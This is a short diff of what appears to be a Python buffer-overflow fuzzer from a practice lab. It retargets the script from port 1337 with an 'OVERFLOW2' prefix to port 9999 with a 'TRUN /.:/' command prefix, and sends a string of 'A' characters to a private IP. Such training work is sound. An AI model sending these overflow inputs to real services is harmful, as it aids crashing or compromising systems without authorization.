@@ -5,9 +5,9 @@ import time
 import sys
 
 ip = "192.168.203.166"
-port = 1337
+port = 9999
 timeout = 5
-prefix = "OVERFLOW2 "
+prefix = "TRUN /.:/"
 
 string = prefix + "A" * 100
 
